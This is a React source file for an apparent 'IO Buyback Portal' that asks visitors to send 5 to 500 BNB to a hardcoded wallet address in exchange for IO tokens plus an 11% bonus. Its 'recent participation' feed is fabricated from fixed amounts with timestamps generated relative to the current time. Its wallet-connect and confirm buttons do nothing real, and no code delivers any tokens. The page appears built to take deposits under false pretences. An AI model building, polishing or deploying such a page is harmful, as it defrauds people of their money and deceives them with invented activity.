import React, { useEffect, useMemo, useState } from "react";
import { createRoot } from "react-dom/client";
import {
  ArrowRight,
  Check,
  Clock3,
  Copy,
  Moon,
  RefreshCw,
  ShieldCheck,
  Sun,
  Wallet,
  X,
} from "lucide-react";
import "./styles.css";

const ADDRESS =
  "0x6b60465D676d5FF50F615F2EB5F88baFA56a42b3";

const BONUS = 0.11;
const MIN = 5;
const MAX = 500;

const amounts = [
  5, 10, 6, 8, 13, 12, 20, 7, 15, 25, 18, 9, 11, 22, 16,
];

const offsets = [
  2, 9, 24, 41, 58, 72, 133, 242, 427, 661, 870, 1500, 3100,
  5200, 7600,
];

const seed = () => {
  const n = Date.now();

  return amounts.map((amount, i) => ({
    id: `activity-${i}-${n}`,
    amount,
    time: new Date(n - offsets[i] * 60000),
  }));
};

const rel = (date, now = Date.now()) => {
  const minutes = Math.max(
    0,
    Math.floor((now - date.getTime()) / 60000)
  );

  if (minutes < 60) {
    return `${minutes} minute${minutes === 1 ? "" : "s"} ago`;
  }

  const hours = Math.floor(minutes / 60);

  if (hours < 24) {
    return `${hours} hour${hours === 1 ? "" : "s"} ago`;
  }

  if (hours < 48) {
    return "Yesterday";
  }

  return `${Math.floor(hours / 24)} days ago`;
};

const money = (value) => {
  if (value == null || Number.isNaN(value)) {
    return "—";
  }

  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    maximumFractionDigits: value < 1 ? 4 : 2,
  }).format(value);
};

const tok = (value) => {
  if (!value || Number.isNaN(value)) {
    return "—";
  }

  return new Intl.NumberFormat("en-US", {
    maximumFractionDigits: 4,
  }).format(value);
};

function Stat({ t, v }) {
  return (
    <div className="stat-card">
      <small>{t}</small>
      <strong>{v}</strong>
    </div>
  );
}

function Market({ name, sym, price, state }) {
  return (
    <div className="card market">
      <b>{name}</b>
      <small>{sym}</small>
      <strong>{price}</strong>
      <small>{state}</small>
    </div>
  );
}

function Row({ l, v, hi }) {
  return (
    <div className={hi ? "row hi" : "row"}>
      <span>{l}</span>
      <b>{v}</b>
    </div>
  );
}

function Step({ n, t }) {
  return (
    <div className="step">
      <b>{n}</b>
      <span>
        <strong>{t}</strong>
        <small>Review the information carefully</small>
      </span>
    </div>
  );
}

function App() {
  const [dark, setDark] = useState(true);
  const [amount, setAmount] = useState(5);
  const [io, setIo] = useState(null);
  const [bnb, setBnb] = useState(null);
  const [state, setState] = useState("loading");
  const [updated, setUpdated] = useState(null);
  const [items, setItems] = useState(seed);
  const [modal, setModal] = useState(false);
  const [wallet, setWallet] = useState(false);
  const [copied, setCopied] = useState(false);
  const [now, setNow] = useState(Date.now());

  async function market() {
    try {
      setState("loading");

      const [ioResponse, bnbResponse] = await Promise.all([
        fetch(
          "https://data-api.binance.vision/api/v3/ticker/price?symbol=IOUSDT"
        ),
        fetch(
          "https://data-api.binance.vision/api/v3/ticker/price?symbol=BNBUSDT"
        ),
      ]);

      if (!ioResponse.ok || !bnbResponse.ok) {
        throw new Error("Market data request failed");
      }

      const ioData = await ioResponse.json();
      const bnbData = await bnbResponse.json();

      const ioPrice = Number(ioData.price);
      const bnbPrice = Number(bnbData.price);

      if (!Number.isFinite(ioPrice) || !Number.isFinite(bnbPrice)) {
        throw new Error("Invalid market data");
      }

      setIo(ioPrice);
      setBnb(bnbPrice);
      setUpdated(Date.now());
      setState("live");
    } catch (error) {
      console.error("Market data error:", error);
      setIo(null);
      setBnb(null);
      setUpdated(null);
      setState("unavailable");
    }
  }

  useEffect(() => {
    market();

    const interval = setInterval(market, 60000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setNow(Date.now());
    }, 30000);

    return () => clearInterval(interval);
  }, []);

  const base = useMemo(() => {
    if (!io || !bnb) {
      return 0;
    }

    return (amount * bnb) / io;
  }, [amount, bnb, io]);

  const bonus = base * BONUS;
  const total = base + bonus;
  const usd = amount * (bnb || 0);

  const range =
    amount < MIN
      ? "Participation starts at 5 BNB."
      : amount > MAX
      ? "Maximum participation is 500 BNB."
      : "";

  const copy = async () => {
    try {
      await navigator.clipboard?.writeText(ADDRESS);
      setCopied(true);

      setTimeout(() => {
        setCopied(false);
      }, 1500);
    } catch (error) {
      console.error("Copy failed:", error);
    }
  };

  return (
    <div className={dark ? "app dark" : "app"}>
      <header>
        <div className="brand">
          <b>IO</b>

          <span>
            <strong>IO Buyback Portal</strong>
            <small>WEB3 BUYBACK NETWORK</small>
          </span>
        </div>

        <nav>
          <a href="#dashboard">Dashboard</a>
          <a href="#buyback">Buyback</a>
          <a href="#calc">Calculator</a>
          <a href="#activity">Activity</a>
          <a href="#about">About</a>
        </nav>

        <div className="actions">
          <button
            type="button"
            onClick={() => setDark(!dark)}
            aria-label="Toggle theme"
          >
            {dark ? <Sun /> : <Moon />}
          </button>

          <button
            type="button"
            className="wallet"
            onClick={() => setWallet(!wallet)}
          >
            <Wallet />
            {wallet ? "0x••••••••" : "Connect Wallet"}
          </button>
        </div>
      </header>

      <main>
        <section id="dashboard" className="hero">
          <div>
            <label>✦ WEB3 ALLOCATION INTERFACE</label>

            <h1>IO Buyback</h1>

            <p>
              Calculate an estimated IO allocation using current
              BNB and IO market prices.
            </p>

            <button
              type="button"
              className="primary"
              onClick={() =>
                document
                  .getElementById("calc")
                  ?.scrollIntoView({ behavior: "smooth" })
              }
            >
              Calculate Allocation
              <ArrowRight />
            </button>
          </div>

          <div className="orb">IO</div>
        </section>

        <div className="stats">
          <Stat t="Minimum Participation" v="5 BNB" />
          <Stat t="Maximum Participation" v="500 BNB" />
          <Stat t="Starting Bonus" v="11%" />
          <Stat t="Network" v="BNB Smart Chain" />
        </div>

        <section id="buyback" className="section">
          <div className="heading">
            <div>
              <label>MARKET OVERVIEW</label>
              <h2>Live Market Data</h2>
            </div>

            <button
              type="button"
              className="outline"
              onClick={market}
            >
              <RefreshCw />
              Refresh
            </button>
          </div>

          <div className="cards">
            <Market
              name="IO Network"
              sym="IO/USD"
              price={money(io)}
              state={state}
            />

            <Market
              name="BNB"
              sym="BNB/USD"
              price={money(bnb)}
              state={state}
            />

            <div className="card market">
              <i>%</i>
              <small>PROGRAM</small>
              <h3>Buyback Program</h3>
              <strong>5–500 BNB</strong>
              <p>11% starting bonus</p>
            </div>
          </div>

          <div className="updated">
            <Clock3 />

            {state === "live"
              ? `Live · Updated ${
                  updated ? rel(new Date(updated)) : "just now"
                }`
              : state === "loading"
              ? "Loading market data…"
              : "Market data temporarily unavailable"}
          </div>
        </section>

        <section id="calc" className="section calc">
          <div className="calculator card">
            <div className="heading">
              <div>
                <label>ESTIMATE</label>
                <h2>Buyback Calculator</h2>

                <p>
                  Enter a BNB amount to estimate an IO allocation.
                </p>
              </div>

              <em>+11% BONUS</em>
            </div>

            <label>BNB Amount</label>

            <div className="input">
              <input
                type="number"
                min="0"
                step="0.01"
                value={amount}
                onChange={(event) =>
                  setAmount(Number(event.target.value))
                }
              />

              <b>BNB</b>
            </div>

            {range && <div className="notice">{range}</div>}

            <Row l="BNB USD Value" v={money(usd)} />
            <Row l="Current BNB Price" v={money(bnb)} />
            <Row l="Current IO Price" v={money(io)} />
            <Row
              l="Base IO Allocation"
              v={`${tok(base)} IO`}
            />
            <Row
              l="Bonus (11%)"
              v={`+${tok(bonus)} IO`}
            />
            <Row
              hi
              l="Estimated Total IO"
              v={`${tok(total)} IO`}
            />

            <button
              type="button"
              className="primary full"
              disabled={amount < MIN || amount > MAX}
              onClick={() => setModal(true)}
            >
              Review Participation
              <ArrowRight />
            </button>

            <small>
              Calculation is an estimate based on displayed market
              data.
            </small>
          </div>
        </section>

        <section id="about" className="twocol section">
          <div className="card info">
            <label>ABOUT</label>

            <h2>About the Buyback</h2>

            <p>
              This interface allows users to review an estimated
              IO allocation using the displayed BNB and IO market
              prices and applicable bonus.
            </p>

            <p>
              Market prices are variable and estimates can change.
            </p>
          </div>

          <div className="card info">
            <label>PROCESS</label>

            <h2>How to Participate</h2>

            <Step n="01" t="Enter BNB Amount" />
            <Step n="02" t="Review Allocation" />
            <Step n="03" t="Review Details" />
            <Step n="04" t="Confirm Tokens" />
          </div>
        </section>

        <section id="activity" className="section">
          <div className="heading">
            <div>
              <label>PARTICIPATION</label>
              <h2>Recent Participation</h2>
              <p>Recent participation activity.</p>
            </div>

            <em>RECENT ACTIVITY</em>
          </div>

          <div className="activity">
            {items.map((item) => (
              <div
                className="activityItem"
                key={item.id}
              >
                <span>●</span>

                <div>
                  <b>{rel(item.time, now)}</b>
                  <small>{item.amount} BNB participated</small>
                </div>
              </div>
            ))}
          </div>
        </section>

        <section className="section faq">
          <label>FAQ</label>

          <h2>Why Participate?</h2>

          <details>
            <summary>What is the participation range?</summary>

            <p>
              The displayed participation range is 5 BNB to
              500 BNB.
            </p>
          </details>

          <details>
            <summary>How is the bonus calculated?</summary>

            <p>
              The calculator applies an 11% bonus to the
              estimated base IO allocation.
            </p>
          </details>

          <details>
            <summary>Why participate?</summary>

            <p>
              Review the estimated allocation, applicable
              bonus, and current displayed market prices
              before continuing.
            </p>
          </details>

          <details>
            <summary>
              Can the estimated allocation change?
            </summary>

            <p>
              Yes. Because the calculation uses market prices,
              the estimated allocation can change as market
              prices change.
            </p>
          </details>
        </section>
      </main>

      <footer>
        <b>IO Buyback Portal</b>

        <span>
          Web3 allocation interface · © 2026
        </span>
      </footer>

      {modal && (
        <div
          className="overlay"
          onClick={() => setModal(false)}
        >
          <div
            className="modal"
            onClick={(event) =>
              event.stopPropagation()
            }
          >
            <button
              type="button"
              className="close"
              onClick={() => setModal(false)}
              aria-label="Close"
            >
              <X />
            </button>

            <div className="modalIcon">
              <ShieldCheck />
            </div>

            <h3>Review Participation</h3>

            <p>
              Review your entered BNB amount and estimated
              IO allocation before continuing.
            </p>

            <div className="modalRows">
              <Row
                l="BNB Amount"
                v={`${amount} BNB`}
              />

              <Row
                l="Estimated Base IO"
                v={`${tok(base)} IO`}
              />

              <Row
                l="Bonus"
                v={`+${tok(bonus)} IO`}
              />

              <Row
                hi
                l="Estimated Total"
                v={`${tok(total)} IO`}
              />
            </div>

            <div className="addressBox">
              <small>Participation Address</small>

              <span>{ADDRESS}</span>

              <button
                type="button"
                onClick={copy}
              >
                {copied ? <Check /> : <Copy />}
                {copied ? "Copied" : "Copy"}
              </button>
            </div>

            <button
              type="button"
              className="primary full"
              onClick={() => setModal(false)}
            >
              Confirm Tokens
              <ArrowRight />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

createRoot(
  document.getElementById("root")
).render(<App />);
